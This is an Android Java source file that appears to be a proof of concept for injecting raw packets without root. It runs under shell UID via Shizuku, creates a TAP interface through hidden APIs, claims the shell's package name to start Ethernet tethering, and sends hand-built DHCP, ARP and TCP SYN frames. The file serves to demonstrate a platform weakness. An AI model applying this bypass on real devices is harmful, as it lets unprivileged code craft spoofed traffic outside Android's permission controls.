package com.example.rootlesspacketpoc;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.ParcelFileDescriptor;
import android.os.Process;
import android.os.SystemClock;
import android.system.Os;
import android.system.OsConstants;
import android.system.StructPollfd;

import java.io.FileDescriptor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executor;
import java.util.concurrent.TimeUnit;

import android.os.Binder;
import android.content.ContextWrapper;
import android.os.IBinder;

import java.lang.reflect.Constructor;
import java.util.function.Supplier;

import java.util.Arrays;

import android.system.ErrnoException;

import java.io.BufferedReader;
import java.io.FileReader;
import java.math.BigInteger;


public class PacketService extends IPacketService.Stub {

    private static final class ShellOpContext extends ContextWrapper {
        ShellOpContext(Context base) {
            super(base);
        }

        public String getOpPackageName() {
            return "com.android.shell";
        }
    }

    @SuppressLint("DefaultLocale")
    @Override
    public String runPoc() {
        try {
            int uid = Process.myUid();

            if (uid != 2000) {
                return "ERROR: this PoC requires ADB-backed Shizuku (shell UID 2000), got UID " + uid;
            }

            String capEff = null;

            try (BufferedReader reader = new BufferedReader(new FileReader("/proc/self/status"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("CapEff:")) {
                        capEff = line.substring("CapEff:".length()).trim();
                        break;
                    }
                }
            }

            BigInteger caps = new BigInteger(capEff, 16);

            boolean capNetAdmin = caps.testBit(12);
            boolean capNetRaw = caps.testBit(13);

            String rawSocketResult;

            try {
                // AF_PACKET = 17.
                // ETH_P_ALL = 0x0003, passed in network byte order -> 0x0300.
                FileDescriptor rawFd = Os.socket(17, OsConstants.SOCK_RAW, 0x0300);

                Os.close(rawFd);
                rawSocketResult = "AVAILABLE";
            } catch (ErrnoException e) {
                rawSocketResult = "DENIED (" + e.getMessage() + ")";
            }

            createTap();
            enableEthernetForTap();
            startEthernetTethering();
            provisionClient();

            PacketBuilder.TcpReply reply = sendTcpSyn();

            return String.format(
                    "CapEff: 0x%s\n"
                            + "CAP_NET_ADMIN: %s\n"
                            + "CAP_NET_RAW: %s\n"
                            + "AF_PACKET/SOCK_RAW: %s\n\n"
                            + "SUCCESS\n"
                            + "UID: %d\n"
                            + "TAP: %s\n"
                            + "Client: %s\n"
                            + "Gateway: %s\n"
                            + "Gateway MAC: %s\n"
                            + "Custom SEQ: 0x%08X\n"
                            + "Returned ACK: 0x%08X",
                    capEff,
                    capNetAdmin ? "present" : "absent",
                    capNetRaw ? "present" : "absent",
                    rawSocketResult,
                    Process.myUid(),
                    tapName,
                    PacketBuilder.ipv4(clientIpv4),
                    PacketBuilder.ipv4(gatewayIpv4),
                    PacketBuilder.mac(gatewayMac),
                    TCP_INITIAL_SEQ,
                    reply.acknowledgment);

        } catch (Throwable e) {
            Throwable cause = unwrap(e);
            return "FAILED\n" + cause.getClass().getSimpleName() + ": " + cause.getMessage();

        } finally {
            cleanupAll();
        }
    }

    @SuppressLint("PrivateApi")
    private Object createShellTetheringManager() throws Exception {
        Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
        IBinder binder = (IBinder) serviceManagerClass.getMethod("getService", String.class).invoke(null, "tethering");

        if (binder == null) {
            throw new IllegalStateException("tethering service unavailable");
        }

        Class<?> tetheringManagerClass = Class.forName("android.net.TetheringManager");
        Constructor<?> constructor = tetheringManagerClass.getConstructor(Context.class, Supplier.class);

        return constructor.newInstance(new ShellOpContext(context), (Supplier<IBinder>) () -> binder);
    }

    // TetheringManager.TETHERING_ETHERNET
    private static final int TETHERING_ETHERNET = 5;

    private final Context context;

    private ParcelFileDescriptor tapFd;
    private String tapName;

    private Object ethernetManager;
    private Object tetheredInterfaceRequest;
    private Object tetheredInterfaceCallback;
    private Object tetheringManager;

    private byte[] clientIpv4;
    private byte[] gatewayIpv4;
    private byte[] gatewayMac;

    private static final byte[] CLIENT_MAC = {
            0x02, 0x11, 0x22, 0x33, 0x44, 0x55
    };

    private static final byte[] TCP_TEST_IP = {
            1, 1, 1, 1
    };

    private static final int TCP_TEST_PORT = 443;
    private static final int TCP_SOURCE_PORT = 40000;
    private static final long TCP_INITIAL_SEQ = 0x12345678L;

    /*
     * Shizuku v13+.
     */
    public PacketService(Context context) {
        this.context = context;
    }

    @Override
    public int getUid() {
        return Process.myUid();
    }

    /*
     * ============================================================
     * CREATE TAP
     * ============================================================
     */

    @SuppressWarnings("WrongConstant")
    private void createTap() throws Exception {
        Object testNetworkManager = context.getSystemService("test_network");
        if (testNetworkManager == null) {
            throw new IllegalStateException("test_network unavailable");
        }

        Object tap = testNetworkManager.getClass().getMethod("createTapInterface").invoke(testNetworkManager);

        tapName = (String) tap.getClass().getMethod("getInterfaceName").invoke(tap);
        tapFd = (ParcelFileDescriptor) tap.getClass().getMethod("getFileDescriptor").invoke(tap);

        if (tapFd == null || !tapFd.getFileDescriptor().valid()) {
            throw new IllegalStateException("invalid TAP fd");
        }
    }

    private boolean isTapOpen() {

        return tapFd != null
                && tapFd.getFileDescriptor() != null
                && tapFd.getFileDescriptor().valid();
    }

    /*
     * ============================================================
     * ENABLE ETHERNET SERVER MODE
     * ============================================================
     */

    @SuppressWarnings("WrongConstant")
    @SuppressLint("PrivateApi")
    private void enableEthernetForTap() throws Exception {
        if (tapName == null || tapFd == null) {
            throw new IllegalStateException("TAP is not ready");
        }

        long identity = Binder.clearCallingIdentity();

        try {
            ethernetManager = context.getSystemService("ethernet");
            if (ethernetManager == null) {
                throw new IllegalStateException("EthernetManager unavailable");
            }

            ethernetManager.getClass().getMethod("setIncludeTestInterfaces", boolean.class).invoke(ethernetManager, true);

            Class<?> callbackClass = Class.forName("android.net.EthernetManager$TetheredInterfaceCallback");

            CountDownLatch latch = new CountDownLatch(1);
            String[] availableIface = new String[1];

            tetheredInterfaceCallback = Proxy.newProxyInstance(
                    PacketService.class.getClassLoader(),
                    new Class<?>[]{callbackClass},
                    (proxy, method, args) -> {
                        switch (method.getName()) {
                            case "onAvailable":
                                availableIface[0] = (String) args[0];
                                latch.countDown();
                                return null;

                            case "onUnavailable":
                                latch.countDown();
                                return null;

                            default:
                                return handleProxyObjectMethod(proxy, method, args);
                        }
                    });

            tetheredInterfaceRequest = ethernetManager.getClass()
                    .getMethod("requestTetheredInterface", Executor.class, callbackClass)
                    .invoke(ethernetManager, (Executor) Runnable::run, tetheredInterfaceCallback);

            if (!latch.await(5, TimeUnit.SECONDS)) {
                throw new IllegalStateException("Timed out waiting for tethered interface");
            }

            if (!tapName.equals(availableIface[0])) {
                throw new IllegalStateException("Expected " + tapName + ", got " + availableIface[0]);
            }

        } finally {
            Binder.restoreCallingIdentity(identity);
        }
    }


    @SuppressWarnings("WrongConstant")
    @SuppressLint("PrivateApi")
    private void startEthernetTethering() throws Exception {
        if (tetheredInterfaceRequest == null) {
            throw new IllegalStateException("Tethered Ethernet interface is not ready");
        }

        Class<?> builderClass = Class.forName("android.net.TetheringManager$TetheringRequest$Builder");
        Class<?> requestClass = Class.forName("android.net.TetheringManager$TetheringRequest");
        Class<?> callbackClass = Class.forName("android.net.TetheringManager$StartTetheringCallback");

        Object builder = builderClass.getConstructor(int.class).newInstance(TETHERING_ETHERNET);
        builderClass.getMethod("setShouldShowEntitlementUi", boolean.class).invoke(builder, false);
        Object request = builderClass.getMethod("build").invoke(builder);

        CountDownLatch latch = new CountDownLatch(1);
        int[] result = {-1};

        Object callback = Proxy.newProxyInstance(
                PacketService.class.getClassLoader(),
                new Class<?>[]{callbackClass},
                (proxy, method, args) -> {
                    switch (method.getName()) {
                        case "onTetheringStarted":
                            result[0] = 0;
                            latch.countDown();
                            return null;

                        case "onTetheringFailed":
                            result[0] = (Integer) args[0];
                            latch.countDown();
                            return null;

                        default:
                            return handleProxyObjectMethod(proxy, method, args);
                    }
                });

        long identity = Binder.clearCallingIdentity();

        try {
            tetheringManager = createShellTetheringManager();

            tetheringManager.getClass()
                    .getMethod("startTethering", requestClass, Executor.class, callbackClass)
                    .invoke(tetheringManager, request, (Executor) Runnable::run, callback);

        } finally {
            Binder.restoreCallingIdentity(identity);
        }

        if (!latch.await(15, TimeUnit.SECONDS)) {
            throw new IllegalStateException("Timed out waiting for tethering start");
        }

        if (result[0] != 0) {
            throw new IllegalStateException("Ethernet tethering failed: " + result[0]);
        }
    }

    private void provisionClient() throws Exception {
        clientIpv4 = null;
        gatewayIpv4 = null;
        gatewayMac = null;

        int xid = (int) (System.nanoTime() ^ Process.myPid());

        PacketBuilder.DhcpInfo offer = null;

        for (int i = 0; i < 10 && offer == null; i++) {
            writeTapFrame(PacketBuilder.buildDhcpDiscover(CLIENT_MAC, xid));
            offer = waitForDhcp(xid, 500, PacketBuilder.DHCP_OFFER);
        }

        if (offer == null) {
            throw new IllegalStateException("DHCP OFFER timeout");
        }

        if (isZeroIpv4(offer.yiaddr)) {
            throw new IllegalStateException("DHCP OFFER has invalid yiaddr");
        }

        if (isZeroIpv4(offer.serverId)) {
            throw new IllegalStateException("DHCP OFFER has no server identifier");
        }

        byte[] request = PacketBuilder.buildDhcpRequest(CLIENT_MAC, xid, offer.yiaddr, offer.serverId);
        writeTapFrame(request);

        PacketBuilder.DhcpInfo ack = waitForDhcp(xid, 5000, PacketBuilder.DHCP_ACK, PacketBuilder.DHCP_NAK);

        if (ack == null) {
            throw new IllegalStateException("DHCP ACK timeout");
        }

        if (ack.messageType == PacketBuilder.DHCP_NAK) {
            throw new IllegalStateException("DHCP NAK received");
        }

        byte[] clientIp = isZeroIpv4(ack.yiaddr) ? offer.yiaddr : ack.yiaddr;

        if (isZeroIpv4(ack.router)) {
            throw new IllegalStateException("DHCP ACK has no router");
        }

        clientIpv4 = Arrays.copyOf(clientIp, clientIp.length);
        gatewayIpv4 = Arrays.copyOf(ack.router, ack.router.length);

        byte[] arpRequest = PacketBuilder.buildArpRequest(CLIENT_MAC, clientIpv4, gatewayIpv4);
        writeTapFrame(arpRequest);

        gatewayMac = waitForArpReply();

        if (gatewayMac == null) {
            throw new IllegalStateException("ARP reply timeout");
        }
    }

    private void writeTapFrame(byte[] frame) throws Exception {
        if (tapFd == null || !tapFd.getFileDescriptor().valid()) {
            throw new IllegalStateException("TAP FD is invalid");
        }

        FileDescriptor fd = tapFd.getFileDescriptor();
        int written = Os.write(fd, frame, 0, frame.length);

        if (written != frame.length) {
            throw new IllegalStateException("Short TAP write: " + written + "/" + frame.length);
        }
    }

    private byte[] readTapFrame(int timeoutMs) throws Exception {
        if (tapFd == null || !tapFd.getFileDescriptor().valid()) {
            return null;
        }

        FileDescriptor fd = tapFd.getFileDescriptor();

        StructPollfd pollfd = new StructPollfd();
        pollfd.fd = fd;
        pollfd.events = (short) OsConstants.POLLIN;

        int ready = Os.poll(new StructPollfd[]{pollfd}, timeoutMs);

        if (ready <= 0 || (pollfd.revents & OsConstants.POLLIN) == 0) {
            return null;
        }

        byte[] buffer = new byte[4096];
        int length = Os.read(fd, buffer, 0, buffer.length);

        return length > 0 ? Arrays.copyOf(buffer, length) : null;
    }

    private PacketBuilder.DhcpInfo waitForDhcp(int xid, int timeoutMs, int... wantedTypes) throws Exception {
        long deadline = SystemClock.elapsedRealtime() + timeoutMs;

        while (true) {
            long remaining = deadline - SystemClock.elapsedRealtime();

            if (remaining <= 0) {
                return null;
            }

            byte[] frame = readTapFrame((int) Math.min(remaining, 500));

            if (frame == null) {
                continue;
            }

            PacketBuilder.DhcpInfo info = PacketBuilder.parseDhcp(frame, xid, CLIENT_MAC);

            if (info == null) {
                continue;
            }

            for (int wanted : wantedTypes) {
                if (info.messageType == wanted) {
                    return info;
                }
            }
        }
    }

    private byte[] waitForArpReply() throws Exception {
        long deadline = SystemClock.elapsedRealtime() + 3000;

        while (true) {
            long remaining = deadline - SystemClock.elapsedRealtime();
            if (remaining <= 0) {
                return null;
            }

            byte[] frame = readTapFrame((int) Math.min(remaining, 500));
            if (frame == null) {
                continue;
            }

            byte[] mac = PacketBuilder.parseArpReplyMac(
                    frame, gatewayIpv4, CLIENT_MAC);

            if (mac != null) {
                return mac;
            }
        }
    }

    private static boolean isZeroIpv4(byte[] ip) {
        return ip == null || ip.length != 4 || (ip[0] == 0 && ip[1] == 0 && ip[2] == 0 && ip[3] == 0);
    }

    private PacketBuilder.TcpReply sendTcpSyn() throws Exception {
        if (clientIpv4 == null || gatewayIpv4 == null || gatewayMac == null) {
            throw new IllegalStateException("Client is not provisioned");
        }

        byte[] syn = PacketBuilder.buildTcpSyn(
                CLIENT_MAC,
                gatewayMac,
                clientIpv4,
                TCP_TEST_IP,
                TCP_SOURCE_PORT,
                TCP_TEST_PORT,
                TCP_INITIAL_SEQ);

        writeTapFrame(syn);

        PacketBuilder.TcpReply reply = waitForTcpReply();

        if (reply == null) {
            throw new IllegalStateException("TCP reply timeout");
        }

        int expectedFlags = PacketBuilder.TCP_SYN | PacketBuilder.TCP_ACK;

        if ((reply.flags & expectedFlags) != expectedFlags) {
            throw new IllegalStateException(
                    "Unexpected TCP flags: 0x" + Integer.toHexString(reply.flags));
        }

        long expectedAck = (TCP_INITIAL_SEQ + 1) & 0xffffffffL;

        if (reply.acknowledgment != expectedAck) {
            throw new IllegalStateException(
                    String.format(
                            "Expected ACK 0x%08X, got 0x%08X",
                            expectedAck,
                            reply.acknowledgment));
        }

        return reply;
    }

    private PacketBuilder.TcpReply waitForTcpReply() throws Exception {
        long deadline = SystemClock.elapsedRealtime() + 5000;

        while (true) {
            long remaining = deadline - SystemClock.elapsedRealtime();
            if (remaining <= 0) {
                return null;
            }

            byte[] frame = readTapFrame((int) Math.min(remaining, 500));
            if (frame == null) {
                continue;
            }

            PacketBuilder.TcpReply reply = PacketBuilder.parseTcpReply(
                    frame,
                    TCP_TEST_IP,
                    clientIpv4,
                    TCP_TEST_PORT,
                    TCP_SOURCE_PORT);

            if (reply != null) {
                return reply;
            }
        }
    }


    /*
     * ============================================================
     * CLOSE TAP
     * ============================================================
     */

    @Override
    public void destroy() {
        cleanupAll();
        System.exit(0);
    }


    /*
     * ============================================================
     * HELPERS
     * ============================================================
     */

    private static Object handleProxyObjectMethod(Object proxy, Method method, Object[] args) {
        String name = method.getName();
        if ("toString".equals(name)) {
            return "PacketServiceProxy";
        }
        if ("hashCode".equals(name)) {
            return System.identityHashCode(proxy);
        }
        if ("equals".equals(name)) {
            return args != null && args.length == 1 && proxy == args[0];
        }
        return null;
    }

    private static Throwable unwrap(Throwable e) {
        Throwable current = e;
        while (current instanceof InvocationTargetException
                        && ((InvocationTargetException) current).getTargetException() != null) {
            current = ((InvocationTargetException) current).getTargetException();
        }
        return current;
    }

    private void cleanupAll() {
        long identity = Binder.clearCallingIdentity();

        try {
            if (tetheringManager != null) {
                try {
                    tetheringManager.getClass()
                            .getMethod("stopTethering", int.class)
                            .invoke(tetheringManager, TETHERING_ETHERNET);
                } catch (Throwable ignored) {
                }
            }

            if (tetheredInterfaceRequest != null) {
                try {
                    tetheredInterfaceRequest.getClass().getMethod("release").invoke(tetheredInterfaceRequest);
                } catch (Throwable ignored) {
                }
            }

            if (ethernetManager != null) {
                try {
                    ethernetManager.getClass()
                            .getMethod("setIncludeTestInterfaces", boolean.class)
                            .invoke(ethernetManager, false);
                } catch (Throwable ignored) {
                }
            }

            if (tapFd != null) {
                try {
                    tapFd.close();
                } catch (Throwable ignored) {
                }
            }

        } finally {
            tetheringManager = null;
            tetheredInterfaceRequest = null;
            tetheredInterfaceCallback = null;
            ethernetManager = null;

            tapFd = null;
            tapName = null;

            clientIpv4 = null;
            gatewayIpv4 = null;
            gatewayMac = null;

            Binder.restoreCallingIdentity(identity);
        }
    }
}